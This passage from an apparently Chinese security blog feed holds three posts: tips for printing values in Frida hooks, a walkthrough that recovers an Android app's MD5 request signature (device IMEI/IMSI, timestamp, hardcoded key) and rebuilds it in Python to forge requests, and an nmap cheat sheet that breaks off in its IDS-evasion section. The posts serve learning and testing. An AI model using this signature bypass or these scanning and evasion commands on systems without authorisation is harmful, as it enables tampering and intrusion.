        <content type="html"><![CDATA[<p>hook操作的时候经常遇到字符串无法打印,打印不出来,或打印出乱码等问题,这时候可以尝试下面方法去解决.</p><p>首先要确认要打印的类型是可打印的,本身如果是不可打印字符串，打印是乱码.</p><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>1.确认类型可以用class类的一个$className属性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">console.log(p.$className)//如果打印P</span><br></pre></td></tr></table></figure><p>2.Java.cast 把p强转为对应类型</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> hashMap = Java.use(<span class="string">&#x27;java.util.HashMap&#x27;</span>)  <span class="comment">//强转类型之前先new要转的类型</span></span><br><span class="line"><span class="keyword">var</span> newret = Java.cast(ret,HashMap)<span class="comment">//Java.cast强转</span></span><br><span class="line">printMap(newret)   <span class="comment">//用下面printmap函数打印hashmap 遍历</span></span><br></pre></td></tr></table></figure><p>或者new完直接用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dd.a.overload(<span class="string">&#x27;java.util.Map&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span>(<span class="params">v</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> p = Java.use(<span class="string">&#x27;java.util.HashMap&#x27;</span>).$new(v)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;map:&#x27;</span>+p)</span><br></pre></td></tr></table></figure><p>3.调用该类对应的输出方法。通常有一个toString()方法</p><p><strong>hashmap 遍历</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printmap</span>(<span class="params">param</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> keys = param.keySet();</span><br><span class="line">    <span class="keyword">var</span> iterator = keys.iterator();</span><br><span class="line">    <span class="keyword">while</span> (iterator.hasNext())&#123;</span><br><span class="line">        <span class="keyword">var</span> k = iterator.next();</span><br><span class="line">        <span class="built_in">console</span>.log(k+<span class="string">&quot;:&quot;</span>+param.get(k));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>byte数组打印</strong></p><p>getBytes数组无法直接打印,bytes array 是object String 和 bytes array可以相互转化String.getBytes() 字符串转bytes array,new String(bytes) bytes转成字符串。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> pwd =Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(<span class="string">&#x27;passwd=aaaaa&amp;salt=3333333&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(pwd.getBytes()) <span class="comment">//输出的是[object object],无法打印出字符串</span></span><br></pre></td></tr></table></figure><p>从新new一个java.lang.String,指定byte数组,构造一个新的string</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bytes = pwd.getBytes()</span><br><span class="line"><span class="keyword">var</span> newpwd = Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(bytes) <span class="comment">//指定bytes类型</span></span><br><span class="line"><span class="built_in">console</span>.log(newpwd)<span class="comment">//打印</span></span><br></pre></td></tr></table></figure><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p><strong>使用js里的JSON类</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="built_in">JSON</span>.stringify(p)) </span><br></pre></td></tr></table></figure><p>可能打印不出来字符串，一般能打印出p的字节数组。（数据和真实数据的对比）</p>]]></content>
      
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>frida定位和还原简单请求参数signature</title>
      <link href="/posts/44205/"/>
      <url>/posts/44205/</url>
      
        <content type="html"><![CDATA[<p>当对APP抓包时，请求参数存在signature签名，导致我们就不能对url进行修改,测试. 这时候我们需要对APP进行逆向分析，找出signature关键代码，进行分析算法，在利用python进行复刻，从而实现改写url实现发包测试.其中Frida更多是扮演了验证我们猜想的辅助工具.</p><p>开始今天的分析:</p><p><img src="https://raw.githubusercontent.com/bbbstark/images/main/image-20220317214616640.png" alt="image-20220317214616640"></p><p>这个APP存在请求参数signature:e6f47b91bb6fb89dc69079fdcb49d7dc</p><p>我们jadx进行反编译分析,根据请求参数,我们利用搜索关键字的方法匹配到signature,由于请求参数名是已知的,在java源码中也是”signature”字符串的形式.</p><p><img src="C:/Users/zlb/AppData/Roaming/Typora/typora-user-images/image-20220317215144779.png" alt="image-20220317215144779"></p><p>定位到第二行<img src="https://raw.githubusercontent.com/bbbstark/images/main/image-20220317215247105.png" alt="image-20220317215247105"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b(&quot;signature&quot;, a(udid, valueOf)).a();</span><br></pre></td></tr></table></figure><p>根据代码可知signature的值用a方法传入两个变量,生成了signature,向上跟踪变量udid和valueOf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String udid = MyApplication.getInstance().getUDID();</span><br><span class="line">String valueOf = String.valueOf(System.currentTimeMillis() / 1000);</span><br></pre></td></tr></table></figure><p>根据currentTimeMillis方法可知其中valueOf是一个到秒的时间戳</p><p>继续向上跟踪getUDID()的方法</p><p><img src="C:/Users/zlb/AppData/Roaming/Typora/typora-user-images/image-20220317215928902.png" alt="image-20220317215928902"></p><p>根据代码可知,getUDID()是一个拼接手机IMEI+IMSI的两个字符串</p><p>到此两个a方法的两个udid,valueOf变量都分析完了,接着我们往下走,去分析 a()方法是怎么构造的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">a</span><span class="params">(String str, String str2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> com.hualong.framework.b.a.a(String.format(<span class="string">&quot;%s&amp;&amp;%s&amp;&amp;%s&quot;</span>, str, str2, <span class="string">&quot;f1190aca-d08e-4041-8666-29931cd89dde&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>a()方法是一个拼接字符串的操作,拼接成<code>str&amp;&amp;str2&amp;&amp;&amp;&amp;f1190aca-d08e-4041-8666-29931cd89dde</code></p><p>其中str是我们上面分析的udid,也就是IMEI+IMSI, str2是到秒的时间戳.继续往下跟方法a它怎么处理的这个字符串</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.hualong.framework.b;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">a</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">a</span><span class="params">(String str)</span> </span>&#123;  <span class="comment">//传进去一个字符串</span></span><br><span class="line">        <span class="keyword">if</span> (str == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        StringBuffer stringBuffer = <span class="keyword">new</span> StringBuffer();<span class="comment">//new StringBuffer</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            MessageDigest instance = MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">            instance.update(str.getBytes());</span><br><span class="line">            <span class="keyword">byte</span>[] digest = instance.digest();<span class="comment">//输出MessageDigest,md5加密的值到digest数组</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">byte</span> b2 : digest) &#123;  <span class="comment">//遍历digest数组</span></span><br><span class="line">                stringBuffer.append(Integer.toString((b2 &gt;&gt;&gt; <span class="number">4</span>) &amp; <span class="number">15</span>, <span class="number">16</span>)).append(Integer.toString(b2 &amp; <span class="number">15</span>, <span class="number">16</span>));<span class="comment">////无符号右移后在进行且运算,Integer.toString(argv,16),表示把argv转成16进制表示的字符串.</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> stringBuffer.toString();<span class="comment">//输出字符串</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据代码我们用Frida hook来验证我们的猜想</p><p>先hook 这个类com.hualong.framework.b.a中的a方法,打印出他的 return stringBuffer.toString();.</p><p>hook代码:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">    <span class="keyword">var</span> act = Java.use(<span class="string">&#x27;com.hualong.framework.b.a&#x27;</span>)</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;1111&#x27;</span>)</span><br><span class="line">    act.a.implementation = <span class="function"><span class="keyword">function</span>(<span class="params">p</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;2222&#x27;</span>)</span><br><span class="line">    <span class="keyword">var</span> tt = <span class="built_in">this</span>.a(p)</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;yc:&#x27;</span>+p)</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;mc:&#x27;</span>+tt)</span><br><span class="line">    <span class="keyword">return</span> tt</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/bbbstark/images/main/image-20220317224805678.png" alt="image-20220317224805678"></p><p>打印出了IMEI867686022237711-IMSI460NNNNNNNNNNNN&amp;&amp;1647521541&amp;&amp;f1190aca-d08e-4041-8666-29931cd89dde和加密后的字符串,可知我们的猜想是对的,接下来我们在进一步判断用js hook复刻这个a方法.我们把字符串传入看看和生成的是否一致</p><p>hook代码:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;   <span class="comment">//由于源代码传入的是一个字符串,我们需要use这个java.lang.String类,new一个对象出来</span></span><br><span class="line"><span class="keyword">var</span> str = Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(<span class="string">&#x27;IMEI867686022237711-IMSI460NNNNNNNNNNNN&amp;&amp;1647521541&amp;&amp;f1190aca-d08e-4041-8666-29931cd89dde&#x27;</span>)</span><br><span class="line"> <span class="built_in">console</span>.log(str)</span><br><span class="line"> <span class="keyword">var</span> stringbuffer = Java.use(<span class="string">&#x27;java.lang.StringBuffer&#x27;</span>).$new() <span class="comment">//new一个StringBuffer类,源代码也是new出来的类</span></span><br><span class="line"> <span class="keyword">var</span> instance = Java.use(<span class="string">&#x27;java.security.MessageDigest&#x27;</span>).getInstance(<span class="string">&quot;MD5&quot;</span>);<span class="comment">//直接使用它引用的类,不需要new</span></span><br><span class="line"> <span class="keyword">var</span> integer = Java.use(<span class="string">&#x27;java.lang.Integer&#x27;</span>)</span><br><span class="line"> instance.update(str.getBytes());<span class="comment">//MessageDigest的update方法去指定byte 数组</span></span><br><span class="line"> <span class="keyword">var</span> digest = instance.digest()<span class="comment">//接收digest数组</span></span><br><span class="line"> <span class="keyword">var</span> len = digest.length   <span class="comment">//返回digest数组的长度</span></span><br><span class="line"> <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;len;i++)  <span class="comment">//循环遍历</span></span><br><span class="line"> &#123;</span><br><span class="line">    stringbuffer.append(integer.toString((digest[i] &gt;&gt;&gt; <span class="number">4</span>) &amp; <span class="number">15</span>, <span class="number">16</span>)).append(integer.toString(digest[i]  &amp; <span class="number">15</span>, <span class="number">16</span>));<span class="comment">////无符号右移后在进行且运算,Integer.toString(argv,16),表示把argv转成16进制表示的字符串.</span></span><br><span class="line"> &#125;</span><br><span class="line"> <span class="built_in">console</span>.log(stringbuffer.toString())<span class="comment">//输出stringbuffer字符串</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/bbbstark/images/main/image-20220317232539087.png" alt="image-20220317232539087"></p><p>可见输出的bd078eb5ff0b276712d5887254639872 和源程序输出一样,证明我们的猜想是正确的.根据上面的分析</p><p>下一步我们开始把这个算法写成python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;IMEI867979020991839-IMSI460NNNNNNNNNNNN&amp;&amp;1629812392&amp;&amp;f1190aca-d08e-4041-8666-29931cd89dde&#x27;</span></span><br><span class="line">sig = <span class="string">&#x27;&#x27;</span></span><br><span class="line">instance = hashlib.md5()</span><br><span class="line">instance.update(<span class="built_in">bytearray</span>(<span class="built_in">str</span>.encode(<span class="string">&#x27;utf8&#x27;</span>)))</span><br><span class="line">digest = instance.digest()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> digest:</span><br><span class="line">    sig = sig + <span class="built_in">format</span>((i&gt;&gt;<span class="number">4</span>)&amp;<span class="number">15</span>, <span class="string">&#x27;x&#x27;</span>) + <span class="built_in">format</span>(i&amp;<span class="number">15</span>, <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sig:&#x27;</span>+sig)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">bytearray</span>(<span class="built_in">str</span>.encode(<span class="string">&#x27;utf8&#x27;</span>)):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">m = hashlib.md5()</span><br><span class="line">m.update(<span class="built_in">bytearray</span>(<span class="built_in">str</span>.encode(<span class="string">&#x27;utf8&#x27;</span>)))</span><br><span class="line"><span class="built_in">print</span>(m.digest())</span><br><span class="line"></span><br><span class="line">str_cons = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">bytearray</span>(m.digest()):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;i:&#x27;</span>,i)</span><br><span class="line">    <span class="comment">#print((i&gt;&gt;4) &amp; 15)</span></span><br><span class="line">    str_cons = str_cons + <span class="built_in">format</span>(((i&gt;&gt;<span class="number">4</span>) &amp;<span class="number">15</span>), <span class="string">&#x27;x&#x27;</span>) + <span class="built_in">format</span>(i &amp; <span class="number">15</span>, <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(str_cons)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/posts/0/"/>
      <url>/posts/0/</url>
      
        <content type="html"><![CDATA[<p><strong>格式：</strong><br><strong>nmap [ &lt;扫描类型&gt; …] [ &lt;选项&gt; ] { &lt;扫描目标说明&gt; }</strong></p><p>Nmap进行完整全面的扫描</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap –T4 <span class="operator">-</span>P80 –A –v</span><br></pre></td></tr></table></figure><p>其中-A选项用于使用进攻性（Aggressive）方式扫描；-T4指定扫描过程使用的时序（Timing），总有6个级别（0-5），级别越高，扫描速度越快，但也容易被防火墙或IDS检测并屏蔽掉，在网络通讯状况良好的情况推荐使用T4；-v表示显示冗余（verbosity）信息，在扫描过程中显示扫描的细节，从而让用户了解当前的扫描状态,-P指定端口。</p><h2 id="常用扫描"><a href="#常用扫描" class="headerlink" title="常用扫描"></a>常用扫描</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="operator">-</span>sV <span class="operator">-</span>sT <span class="operator">-</span>Pn <span class="operator">-</span> <span class="operator">-</span><span class="keyword">open</span> <span class="operator">-</span>v <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span> 不使用ping对ip进行服务识别 使用tcp发包 返回</span><br><span class="line">端口开放的结果</span><br><span class="line">nmap <span class="operator">-</span>sT <span class="operator">-</span>Pn <span class="comment">--open -v banner.nse 192.168.1.1 获取服务器的banner信息</span></span><br><span class="line">nmap <span class="operator">-</span>sP <span class="number">192.168</span><span class="number">.0</span><span class="number">.0</span><span class="operator">/</span><span class="number">24</span> 判断哪些主机存活</span><br><span class="line">nmap <span class="operator">-</span>sT <span class="number">192.168</span><span class="number">.0</span><span class="number">.3</span> 开放了哪些端口</span><br><span class="line">nmap <span class="operator">-</span>sS <span class="number">192.168</span><span class="number">.0</span><span class="number">.127</span> 开放了哪些端口（隐蔽扫描）</span><br><span class="line">nmap <span class="operator">-</span>sU <span class="number">192.168</span><span class="number">.0</span><span class="number">.127</span> 开放了哪些端口（UDP）</span><br><span class="line">nmap <span class="operator">-</span>sS <span class="operator">-</span>O <span class="number">192.168</span><span class="number">.0</span><span class="number">.127</span> 操作系统识别</span><br><span class="line">nmap <span class="operator">-</span>sT <span class="operator">-</span>p <span class="number">80</span> <span class="operator">-</span>oG – <span class="number">192.168</span><span class="number">.1</span>.<span class="operator">*</span> <span class="operator">|</span> grep <span class="keyword">open</span> 列出开放了指定端口的主机列表</span><br><span class="line">nmap <span class="operator">-</span>sV <span class="operator">-</span>p <span class="number">80</span> baidu.com 列出服务器类型(列出操作系统，开发端口，服务器类型,网站脚本类型等)</span><br></pre></td></tr></table></figure><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#主机发现#   选项用于选择不同的 ping 方法</span><br><span class="line">nmap <span class="operator">-</span>sP<span class="operator">/</span><span class="operator">-</span>sn ping扫描存活主机 不进行端口扫描.</span><br><span class="line">nmap <span class="operator">-</span>Pn    不检测主机存活跳过主机发现 直接扫描,也就是没有用到ping</span><br><span class="line">nmap <span class="operator">-</span>PS<span class="operator">/</span>PA<span class="operator">/</span>PU<span class="operator">/</span>PY[portlist] TCP SYN Ping<span class="operator">/</span>TCP ACK Ping<span class="operator">/</span>UDP Ping发现</span><br><span class="line">nmap <span class="operator">-</span>PE<span class="operator">/</span>PP<span class="operator">/</span>PM: 使用ICMP echo, <span class="type">timestamp</span>, <span class="keyword">and</span> netmask 请求包发现主机。</span><br><span class="line">nmap <span class="operator">-</span>PO[protocollist]: 使用IP协议包探测对方主机是否开启。</span><br><span class="line"></span><br><span class="line">nmap <span class="operator">-</span>PO[prococol list] 使用IP协议包探测对方主机是否开启</span><br><span class="line">nmap <span class="operator">-</span>n<span class="operator">/</span><span class="operator">-</span>R 不对IP进行域名反向解析<span class="operator">/</span>为所有的IP都进行域名的反响解析</span><br><span class="line">nmap <span class="comment">--dns-servers &lt;serv1[,serv2],...&gt;: 指定DNS服务器。  </span></span><br><span class="line">nmap <span class="comment">--system-dns: 指定使用系统的DNS服务器  </span></span><br><span class="line">nmap <span class="comment">--traceroute: 追踪每个路由节点 </span></span><br></pre></td></tr></table></figure><h2 id="扫描技术"><a href="#扫描技术" class="headerlink" title="扫描技术"></a>扫描技术</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#扫描技术#   检测开放端口的方法(对于确定为在线的主机)</span><br><span class="line">nmap <span class="operator">-</span>sS    SYN扫描 只进行前两次握手  一般不会被日志记录</span><br><span class="line">nmap <span class="operator">-</span>sT    TCP三次握手扫描          会被日志记录</span><br><span class="line">nmap <span class="operator">-</span>sV    端口版本服务信息扫描</span><br><span class="line">nmap <span class="operator">-</span>O     系统版本信息扫描</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="operator">-</span>sA<span class="operator">/</span>sW<span class="operator">/</span>sM TCP SYN<span class="operator">/</span>TCP <span class="keyword">connect</span>()<span class="operator">/</span>ACK<span class="operator">/</span>TCP窗口扫描<span class="operator">/</span>TCP Maimon扫描</span><br><span class="line"><span class="operator">-</span>sU UDP扫描</span><br><span class="line"><span class="operator">-</span>sN<span class="operator">/</span>sF<span class="operator">/</span>sX TCP <span class="keyword">Null</span>，FIN，<span class="keyword">and</span> Xmas扫描</span><br><span class="line"><span class="comment">--scanflags 自定义TCP包中的flags</span></span><br><span class="line"><span class="operator">-</span>sI zombie host[:probeport] Idlescan</span><br><span class="line"><span class="operator">-</span>sY<span class="operator">/</span>sZ SCTP INIT<span class="operator">/</span>COOKIE<span class="operator">-</span>ECHO 扫描</span><br><span class="line"><span class="operator">-</span>sO 使用IP protocol 扫描确定目标机支持的协议类型</span><br><span class="line"><span class="operator">-</span>b “FTP relay host” 使用FTP bounce scan</span><br><span class="line"><span class="comment">--scanflags &lt;flags&gt;: 定制TCP包的flags。  </span></span><br></pre></td></tr></table></figure><h2 id="批量扫描"><a href="#批量扫描" class="headerlink" title="批量扫描"></a>批量扫描</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="operator">-</span>sT <span class="operator">-</span>sV <span class="operator">-</span>p80<span class="number">-89</span>,<span class="number">8080</span><span class="number">-8099</span>,<span class="number">8000</span><span class="number">-8009</span>,<span class="number">7001</span><span class="number">-7009</span>,<span class="number">9000</span><span class="operator">-</span></span><br><span class="line"><span class="number">9099</span>,<span class="number">21</span>,<span class="number">443</span>,<span class="number">873</span>,<span class="number">2601</span>,<span class="number">2604</span>,<span class="number">3128</span>,<span class="number">4440</span>,<span class="number">6082</span>,<span class="number">6379</span>,<span class="number">8888</span>,<span class="number">3389</span>,<span class="number">9200</span>,<span class="number">11211</span>,<span class="number">27017</span>,<span class="number">2801</span></span><br><span class="line"><span class="number">7</span>,<span class="number">389</span>,<span class="number">8443</span>,<span class="number">4848</span>,<span class="number">8649</span>,<span class="number">995</span>,<span class="number">9440</span>,<span class="number">9871</span>,<span class="number">2222</span>,<span class="number">2082</span>,<span class="number">3311</span>,<span class="number">18100</span>,<span class="number">9956</span>,<span class="number">1433</span>,<span class="number">3306</span>,<span class="number">1900</span>,<span class="number">4</span></span><br><span class="line"><span class="number">9705</span>,<span class="number">50030</span>,<span class="number">7778</span>,<span class="number">5432</span>,<span class="number">7080</span>,<span class="number">5900</span>,<span class="number">50070</span>,<span class="number">5000</span>,<span class="number">5560</span>,<span class="number">10000</span> <span class="comment">--open --max-hostgroup</span></span><br><span class="line"><span class="number">10</span> <span class="comment">--max-parallelism 10 --max-rtt-timeout 1000ms --host-timeout 800s --max-scan-delay 2000ms -iL ~/Desktop/ip.txt -oN ~/Desktop/result/result.txt</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="operator">-</span>sT <span class="operator">-</span>sV <span class="operator">-</span>O <span class="operator">-</span>P0 <span class="comment">--open -n -oN result.txt -p80-89,8080-8099,8000-</span></span><br><span class="line"><span class="number">8009</span>,<span class="number">7001</span><span class="number">-7009</span>,<span class="number">9000</span><span class="operator">-</span></span><br><span class="line"><span class="number">9099</span>,<span class="number">21</span>,<span class="number">443</span>,<span class="number">873</span>,<span class="number">2601</span>,<span class="number">2604</span>,<span class="number">3128</span>,<span class="number">4440</span>,<span class="number">6082</span>,<span class="number">6379</span>,<span class="number">8888</span>,<span class="number">3389</span>,<span class="number">9200</span>,<span class="number">11211</span>,<span class="number">27017</span>,<span class="number">2801</span></span><br><span class="line"><span class="number">7</span>,<span class="number">389</span>,<span class="number">8443</span>,<span class="number">4848</span>,<span class="number">8649</span>,<span class="number">995</span>,<span class="number">9440</span>,<span class="number">9871</span>,<span class="number">2222</span>,<span class="number">2082</span>,<span class="number">3311</span>,<span class="number">18100</span>,<span class="number">9956</span>,<span class="number">1433</span>,<span class="number">3306</span>,<span class="number">1900</span>,<span class="number">4</span></span><br><span class="line"><span class="number">9705</span>,<span class="number">50030</span>,<span class="number">7778</span>,<span class="number">5432</span>,<span class="number">7080</span>,<span class="number">5900</span>,<span class="number">50070</span>,<span class="number">5000</span>,<span class="number">5560</span>,<span class="number">10000</span> <span class="operator">-</span>iL ip.txt</span><br><span class="line"><span class="comment">--open 只输出端口开放的结果 输出到result.txt文件</span></span><br></pre></td></tr></table></figure><h2 id="OS识别"><a href="#OS识别" class="headerlink" title="OS识别"></a>OS识别</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">-</span>O 启用操作系统检测,<span class="operator">-</span>A来同时启用操作系统检测和版本检测</span><br><span class="line"><span class="comment">--osscan-limit 针对指定的目标进行操作系统检测(至少需确知该主机分别有一个open和</span></span><br><span class="line">closed的端口)</span><br><span class="line"><span class="comment">--osscan-guess 推测操作系统检测结果,当Nmap无法确定所检测的操作系统时，会尽可能地提</span></span><br><span class="line">供最相近的匹配，Nmap默认进行这种匹配</span><br></pre></td></tr></table></figure><h2 id="防火墙-IDS躲避和哄骗"><a href="#防火墙-IDS躲避和哄骗" class="headerlink" title="防火墙/IDS躲避和哄骗"></a>防火墙/IDS躲避和哄骗</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">-</span>f; <span class="comment">--mtu value 指定使用分片、指定数据包的MTU.</span></span><br><span class="line"><span class="operator">-</span>D decoy1,decoy2,ME 使用诱饵隐蔽扫描</span><br><span class="line"><span class="operator">-</span>S IP<span class="operator">-</span>ADDRESS 